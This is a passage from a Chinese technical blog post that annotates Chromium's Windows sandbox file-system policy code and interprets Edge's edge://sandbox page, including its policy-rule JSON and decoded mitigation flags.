kCallNtSetInfoRename;</span><br><span class="line">  <span class="comment">//创建 5 个PolicyRule，分别管制5种请求，action为ASK_BROKER</span></span><br><span class="line">  <span class="function">PolicyRule <span class="title">create</span><span class="params">(result)</span></span>;</span><br><span class="line">  <span class="function">PolicyRule <span class="title">open</span><span class="params">(result)</span></span>;</span><br><span class="line">  <span class="function">PolicyRule <span class="title">query</span><span class="params">(result)</span></span>;</span><br><span class="line">  <span class="function">PolicyRule <span class="title">query_full</span><span class="params">(result)</span></span>;</span><br><span class="line">  <span class="function">PolicyRule <span class="title">rename</span><span class="params">(result)</span></span>;</span><br><span class="line">  <span class="comment">//根据不同的semantics，添加不同的 policy</span></span><br><span class="line">  <span class="keyword">switch</span> (semantics) &#123;</span><br><span class="line">    <span class="keyword">case</span> TargetPolicy::FILES_ALLOW_DIR_ANY: &#123;</span><br><span class="line">      open.AddNumberMatch(IF, OpenFile::OPTIONS, FILE_DIRECTORY_FILE, AND);</span><br><span class="line">      create.AddNumberMatch(IF, OpenFile::OPTIONS, FILE_DIRECTORY_FILE, AND);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> TargetPolicy::FILES_ALLOW_READONLY: &#123;</span><br><span class="line">      <span class="comment">// We consider all flags that are not known to be readonly as potentially</span></span><br><span class="line">      <span class="comment">// used for write.</span></span><br><span class="line">      DWORD allowed_flags = FILE_READ_DATA | FILE_READ_ATTRIBUTES |</span><br><span class="line">                            FILE_READ_EA | SYNCHRONIZE | FILE_EXECUTE |</span><br><span class="line">                            GENERIC_READ | GENERIC_EXECUTE | READ_CONTROL;</span><br><span class="line">      DWORD restricted_flags = ~allowed_flags;</span><br><span class="line">      open.AddNumberMatch(IF_NOT, OpenFile::ACCESS, restricted_flags, AND);</span><br><span class="line">      open.AddNumberMatch(IF, OpenFile::DISPOSITION, FILE_OPEN, EQUAL);</span><br><span class="line">      create.AddNumberMatch(IF_NOT, OpenFile::ACCESS, restricted_flags, AND);</span><br><span class="line">      create.AddNumberMatch(IF, OpenFile::DISPOSITION, FILE_OPEN, EQUAL);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Read only access don&#x27;t work for rename.</span></span><br><span class="line">      rule_to_add &amp;= ~kCallNtSetInfoRename;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> TargetPolicy::FILES_ALLOW_QUERY: &#123;</span><br><span class="line">      <span class="comment">// Here we don&#x27;t want to add policy for the open or the create.</span></span><br><span class="line">      rule_to_add &amp;=</span><br><span class="line">          ~(kCallNtOpenFile | kCallNtCreateFile | kCallNtSetInfoRename);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> TargetPolicy::FILES_ALLOW_ANY: &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">default</span>: &#123;</span><br><span class="line">      NOTREACHED();</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 根据当前rule_to_add的状态，把OpenFile::NAME这一参数进行设置</span></span><br><span class="line">  <span class="comment">// PolicyRule add好以后，就通过policy-&gt;AddRule添加到LowLevelPolicy中</span></span><br><span class="line">  <span class="comment">// 注意AddRule时会绑定service id和PolicyRule</span></span><br><span class="line">  <span class="comment">// filesystem子系统占用了5个service id，分别对应open, create, rename, query, queryFull</span></span><br><span class="line">  <span class="keyword">if</span> ((rule_to_add &amp; kCallNtCreateFile) &amp;&amp;</span><br><span class="line">      (!create.AddStringMatch(IF, OpenFile::NAME, name, CASE_INSENSITIVE) ||</span><br><span class="line">       !policy-&gt;AddRule(IpcTag::NTCREATEFILE, &amp;create))) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((rule_to_add &amp; kCallNtOpenFile) &amp;&amp;</span><br><span class="line">      (!open.AddStringMatch(IF, OpenFile::NAME, name, CASE_INSENSITIVE) ||</span><br><span class="line">       !policy-&gt;AddRule(IpcTag::NTOPENFILE, &amp;open))) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((rule_to_add &amp; kCallNtQueryAttributesFile) &amp;&amp;</span><br><span class="line">      (!query.AddStringMatch(IF, FileName::NAME, name, CASE_INSENSITIVE) ||</span><br><span class="line">       !policy-&gt;AddRule(IpcTag::NTQUERYATTRIBUTESFILE, &amp;query))) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((rule_to_add &amp; kCallNtQueryFullAttributesFile) &amp;&amp;</span><br><span class="line">      (!query_full.AddStringMatch(IF, FileName::NAME, name, CASE_INSENSITIVE) ||</span><br><span class="line">       !policy-&gt;AddRule(IpcTag::NTQUERYFULLATTRIBUTESFILE, &amp;query_full))) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((rule_to_add &amp; kCallNtSetInfoRename) &amp;&amp;</span><br><span class="line">      (!rename.AddStringMatch(IF, FileName::NAME, name, CASE_INSENSITIVE) ||</span><br><span class="line">       !policy-&gt;AddRule(IpcTag::NTSETINFO_RENAME, &amp;rename))) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以下是调用的实例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//chromium/sandbox/win/src/sandbox_policy_base.cc</span></span><br><span class="line"><span class="function">ResultCode <span class="title">PolicyBase::AddRuleInternal</span><span class="params">(SubSystem subsystem,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       Semantics semantics,</span></span></span><br><span class="line"><span class="function"><span class="params">                                       <span class="keyword">const</span> <span class="keyword">wchar_t</span>* pattern)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!policy_) &#123;</span><br><span class="line">     <span class="comment">// 如果policy_未被设置，make一个4096*14尺寸的PolicyGlobal</span></span><br><span class="line">    policy_ = MakeBrokerPolicyMemory();</span><br><span class="line">    DCHECK(policy_);</span><br><span class="line">     <span class="comment">// 使用该PolicyGlobal new出一个LowLevelPolicy</span></span><br><span class="line">    policy_maker_ = <span class="keyword">new</span> LowLevelPolicy(policy_);</span><br><span class="line">    DCHECK(policy_maker_);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (subsystem) &#123;</span><br><span class="line">    <span class="keyword">case</span> SUBSYS_FILES: &#123;</span><br><span class="line">      <span class="keyword">if</span> (!file_system_init_) &#123; <span class="comment">//确定 filesystem 被初始化，一开始file_system_init_是false</span></span><br><span class="line">        <span class="keyword">if</span> (!FileSystemPolicy::SetInitialRules(policy_maker_))</span><br><span class="line">            <span class="comment">// 执行完SetInitialRules后，file_system_init_置true，即SetInitialRules只执行一次</span></span><br><span class="line">          <span class="keyword">return</span> SBOX_ERROR_BAD_PARAMS;</span><br><span class="line">        file_system_init_ = <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">        <span class="comment">// 根据传入的pattern,semantics，用LowLevelPolicy生成一个rule</span></span><br><span class="line">      <span class="keyword">if</span> (!FileSystemPolicy::GenerateRules(pattern, semantics, policy_maker_)) &#123;</span><br><span class="line">        NOTREACHED();</span><br><span class="line">        <span class="keyword">return</span> SBOX_ERROR_BAD_PARAMS;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> SBOX_ALL_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="FileSystemPolicy-SetInitialRules"><a href="#FileSystemPolicy-SetInitialRules" class="headerlink" title="FileSystemPolicy::SetInitialRules()"></a>FileSystemPolicy::SetInitialRules()</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">FileSystemPolicy::SetInitialRules</span><span class="params">(LowLevelPolicy* policy)</span> </span>&#123;</span><br><span class="line">  <span class="function">PolicyRule <span class="title">format</span><span class="params">(ASK_BROKER)</span></span>;</span><br><span class="line">  <span class="function">PolicyRule <span class="title">short_name</span><span class="params">(ASK_BROKER)</span></span>;</span><br><span class="line">  <span class="comment">// 两个ASK_BROKER的action rule</span></span><br><span class="line">    </span><br><span class="line">  <span class="keyword">bool</span> rv = format.AddNumberMatch(IF_NOT, FileName::BROKER, BROKER_TRUE, AND);</span><br><span class="line">  rv &amp;= format.AddStringMatch(IF_NOT, FileName::NAME, <span class="string">L&quot;\\/?/?\\*&quot;</span>,</span><br><span class="line">                              CASE_SENSITIVE);</span><br><span class="line">  <span class="comment">// format按位与匹配FileName::BROKER没有BROKER_TRUE标志位</span></span><br><span class="line">  rv &amp;= short_name.AddNumberMatch(IF_NOT, FileName::BROKER, BROKER_TRUE, AND);</span><br><span class="line">  <span class="comment">// 匹配FileName::NAME不能为L&quot;\\/?/?\\*&quot;</span></span><br><span class="line">  rv &amp;= short_name.AddStringMatch(IF, FileName::NAME, <span class="string">L&quot;*~*&quot;</span>, CASE_SENSITIVE);</span><br><span class="line">    </span><br><span class="line">  <span class="comment">// 为5个service id，各添加这两个rule到LowLevelPolicy</span></span><br><span class="line">  <span class="keyword">if</span> (!rv || !policy-&gt;AddRule(IpcTag::NTCREATEFILE, &amp;format))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!policy-&gt;AddRule(IpcTag::NTCREATEFILE, &amp;short_name))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!policy-&gt;AddRule(IpcTag::NTOPENFILE, &amp;format))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!policy-&gt;AddRule(IpcTag::NTOPENFILE, &amp;short_name))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!policy-&gt;AddRule(IpcTag::NTQUERYATTRIBUTESFILE, &amp;format))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!policy-&gt;AddRule(IpcTag::NTQUERYATTRIBUTESFILE, &amp;short_name))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!policy-&gt;AddRule(IpcTag::NTQUERYFULLATTRIBUTESFILE, &amp;format))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!policy-&gt;AddRule(IpcTag::NTQUERYFULLATTRIBUTESFILE, &amp;short_name))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!policy-&gt;AddRule(IpcTag::NTSETINFO_RENAME, &amp;format))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!policy-&gt;AddRule(IpcTag::NTSETINFO_RENAME, &amp;short_name))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整个初始化函数为 low-level policy 定制一了一套初级的策略。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><strong>FileSystem的low-level policy部分做了两件事：</strong></p><ul><li>为<code>PolicyBase::AddRule</code>提供了该子系统5个service或者叫action的Rule制定接口。</li><li>编写了broker端5个(create, open, rename, query, queryFull)请求的处理，在broker端调用了对应的API函数。</li></ul><h1 id="edge-sandbox"><a href="#edge-sandbox" class="headerlink" title="edge://sandbox"></a>edge://sandbox</h1><p>当我们在 edge 输入 edge://sandbox 会返回如下界面</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20210802183113.png" alt="image-20210728192811294"></p><p>粗略的看，里面包含一个活动进程表(不包括浏览器进程，因为它没有被沙箱化)和一些摘要信息，然后和每个进程的详细沙箱配置的原始数据转储成的 JSON 序列。关于像 <code>NtCreateFile</code>这些<code>service</code>的 policy 是如何设置的在上文已经进行过解读，下文主要分析一下这个页面是什么含义。</p><p>以以下序列为例，进行解读。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;desiredIntegrityLevel&quot;</span>: <span class="string">&quot;S-1-16-4096 Low&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;desiredMitigations&quot;</span>: <span class="string">&quot;0000000000af1267&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;disconnectCsrss&quot;</span>: <span class="string">&quot;disabled&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;jobLevel&quot;</span>: <span class="string">&quot;Limited User&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;lockdownLevel&quot;</span>: <span class="string">&quot;Limited&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;platformMitigations&quot;</span>: <span class="string">&quot;01111001000110000000000000010000&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;policyRules&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;CreateNamedPipeW&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;prefix_i(p[0], &#x27;\\\\.\\pipe\\LOCAL\\chrome.sync.&#x27;) -&gt; askBroker&quot;</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;NtCreateFile&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;!(p[1] &amp; 1) &amp;&amp; !(prefix(p[0], &#x27;\\??\\&#x27;)) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;!(p[1] &amp; 1) &amp;&amp; scan(p[0], &#x27;~&#x27;) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;prefix_i(p[0], &#x27;\\??\\pipe\\chrome.&#x27;) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;prefix_i(p[0], &#x27;\\??\\pipe\\LOCAL\\chrome.&#x27;) -&gt; askBroker&quot;</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;NtOpenFile&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;!(p[1] &amp; 1) &amp;&amp; !(prefix(p[0], &#x27;\\??\\&#x27;)) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;!(p[1] &amp; 1) &amp;&amp; scan(p[0], &#x27;~&#x27;) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;prefix_i(p[0], &#x27;\\??\\pipe\\chrome.&#x27;) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;prefix_i(p[0], &#x27;\\??\\pipe\\LOCAL\\chrome.&#x27;) -&gt; askBroker&quot;</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;NtQueryAttributesFile&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;!(p[1] &amp; 1) &amp;&amp; !(prefix(p[0], &#x27;\\??\\&#x27;)) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;!(p[1] &amp; 1) &amp;&amp; scan(p[0], &#x27;~&#x27;) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;prefix_i(p[0], &#x27;\\??\\pipe\\chrome.&#x27;) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;prefix_i(p[0], &#x27;\\??\\pipe\\LOCAL\\chrome.&#x27;) -&gt; askBroker&quot;</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;NtQueryFullAttributesFile&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;!(p[1] &amp; 1) &amp;&amp; !(prefix(p[0], &#x27;\\??\\&#x27;)) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;!(p[1] &amp; 1) &amp;&amp; scan(p[0], &#x27;~&#x27;) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;prefix_i(p[0], &#x27;\\??\\pipe\\chrome.&#x27;) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;prefix_i(p[0], &#x27;\\??\\pipe\\LOCAL\\chrome.&#x27;) -&gt; askBroker&quot;</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;NtSetInfoRename&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;!(p[1] &amp; 1) &amp;&amp; !(prefix(p[0], &#x27;\\??\\&#x27;)) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;!(p[1] &amp; 1) &amp;&amp; scan(p[0], &#x27;~&#x27;) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;prefix_i(p[0], &#x27;\\??\\pipe\\chrome.&#x27;) -&gt; askBroker&quot;</span>,</span><br><span class="line">        <span class="string">&quot;prefix_i(p[0], &#x27;\\??\\pipe\\LOCAL\\chrome.&#x27;) -&gt; askBroker&quot;</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;processIds&quot;</span>: [</span><br><span class="line">      <span class="number">4888</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>关于<code>Mitigations</code>我们可以使用 google 提供的解码器进行解码：<a href="https://docs.google.com/a/chromium.org/viewer?a=v&amp;pid=sites&amp;srcid=Y2hyb21pdW0ub3JnfGRldnxneDo3MDg0MDMzODNjODgzMDMy">https://docs.google.com/a/chromium.org/viewer?a=v&amp;pid=sites&amp;srcid=Y2hyb21pdW0ub3JnfGRldnxneDo3MDg0MDMzODNjODgzMDMy</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Paste mitigation values from chrome:&#x2F;&#x2F;sandbox output.</span><br><span class="line">Chrome (desiredMitigations): </span><br><span class="line">0000000000af1267</span><br><span class="line"></span><br><span class="line">Platform (platformMitigations): </span><br><span class="line">01111001000110000000000000010000</span><br><span class="line"></span><br><span class="line">MITIGATION_DEP</span><br><span class="line">MITIGATION_DEP_NO_ATL_THUNK</span><br><span class="line">MITIGATION_SEHOP</span><br><span class="line">MITIGATION_HEAP_TERMINATE</span><br><span class="line">MITIGATION_BOTTOM_UP_ASLR</span><br><span class="line">MITIGATION_DLL_SEARCH_ORDER</span><br><span class="line">MITIGATION_EXTENSION_POINT_DISABLE</span><br><span class="line">MITIGATION_NONSYSTEM_FONT_DISABLE</span><br><span class="line">MITIGATION_FORCE_MS_SIGNED_BINS</span><br><span class="line">MITIGATION_IMAGE_LOAD_NO_REMOTE</span><br><span class="line">MITIGATION_IMAGE_LOAD_NO_LOW_LABEL</span><br><span class="line">MITIGATION_RESTRICT_INDIRECT_BRANCH_PREDICTION</span><br><span class="line"></span><br><span class="line">HEAP_TERMINATE_ALWAYS_ON</span><br><span class="line">BOTTOM_UP_ASLR_ALWAYS_ON</span><br><span class="line">EXTENSION_POINT_DISABLE_ALWAYS_ON</span><br><span class="line">BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON</span><br><span class="line">FONT_DISABLE_ALWAYS_ON</span><br><span class="line">IMAGE_LOAD_NO_REMOTE_ALWAYS_ON</span><br><span class="line">IMAGE_LOAD_NO_LOW_LABEL_ALWAYS_ON</span><br><span class="line">RESTRICT_INDIRECT_BRANCH_PREDICTION_ALWAYS_ON</span><br></pre></td></tr></table></figure><p>其中很大一部分都是在构造函数中传递的数值，这里主要分析一下<code>policyRules</code>，调用如下函数：</p><h2 id="GetPolicyRules"><a href="#GetPolicyRules" class="headerlink" title="GetPolicyRules"></a>GetPolicyRules</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">base::Value <span class="title">GetPolicyRules</span><span class="params">(<span class="keyword">const</span> PolicyGlobal* policy_rules)</span> </span>&#123;</span><br><span class="line">  DCHECK(policy_rules);</span><br><span class="line">  <span class="function">base::Value <span class="title">results</span><span class="params">(base::Value::Type::DICTIONARY)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; kMaxServiceCount; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!policy_rules-&gt;entry[i])</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    IpcTag service = <span class="keyword">static_cast</span>&lt;IpcTag&gt;(i);</span><br><span class="line">    results.SetKey(GetIpcTagAsString(service), <span class="comment">//根据 service 去获取其policy_rules</span></span><br><span class="line">                   GetPolicyOpcodes(policy_rules, service));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> results;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>GetPolicyRules</code>内部又会调用<code>GetIpcTagAsString</code>来获取 Ipc 的 tag，如：<code>NtCreateFile</code>这些，然后紧接着对这些 tag 的 policy 进行解析，调用<code>GetPolicyOpcodes</code></p><p><code>entry</code>指针数组，用以索引<code>PolicyGlobal</code>内每个<code>PolicyBuffer</code>。<code>PolicyBuffer</code> 是一个结构体，它包含要按顺序创建或评估的所有操作码。</p><blockquote><p>struct PolicyBuffer {</p><p> size_t opcode_count;</p><p> PolicyOpcode opcodes[1];</p><p>};</p></blockquote><h2 id="GetPolicyOpcodes"><a href="#GetPolicyOpcodes" class="headerlink" title="GetPolicyOpcodes"></a>GetPolicyOpcodes</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">base::Value <span class="title">GetPolicyOpcodes</span><span class="params">(<span class="keyword">const</span> PolicyGlobal* policy_rules, IpcTag service)</span> </span>&#123;</span><br><span class="line">  <span class="function">base::Value <span class="title">entry</span><span class="params">(base::Value::Type::LIST)</span></span>;</span><br><span class="line">  PolicyBuffer* policy_buffer = policy_rules-&gt;entry[<span class="keyword">static_cast</span>&lt;<span class="keyword">size_t</span>&gt;(service)];</span><br><span class="line">  <span class="comment">// Build up rules and emit when we hit an action.</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> cur_rule;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; policy_buffer-&gt;opcode_count; i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> PolicyOpcode* opcode = &amp;policy_buffer-&gt;opcodes[i];</span><br><span class="line">    <span class="keyword">if</span> (opcode-&gt;GetID() != OP_ACTION) &#123; <span class="comment">//获取 opcodeID，也就是 OPCODE 类型</span></span><br><span class="line">      DCHECK(i + <span class="number">1</span> &lt; policy_buffer-&gt;opcode_count)</span><br><span class="line">          &lt;&lt; <span class="string">&quot;Non-actions should not terminate rules&quot;</span>;</span><br><span class="line">        <span class="comment">//如果下个 OPCODE 类型不是OP_ACTION，则返回 true</span></span><br><span class="line">      <span class="keyword">bool</span> peak = policy_buffer-&gt;opcodes[i + <span class="number">1</span>].GetID() != OP_ACTION; </span><br><span class="line">        <span class="comment">//获取opcode</span></span><br><span class="line">      cur_rule += GetPolicyOpcode(opcode, peak);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      cur_rule += <span class="string">&quot; -&gt; &quot;</span>;</span><br><span class="line">      cur_rule += GetPolicyOpcode(opcode, <span class="literal">false</span>);</span><br><span class="line">      entry.Append(cur_rule);</span><br><span class="line">      cur_rule.clear();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> entry;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="GetPolicyOpcode"><a href="#GetPolicyOpcode" class="headerlink" title="GetPolicyOpcode"></a>GetPolicyOpcode</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 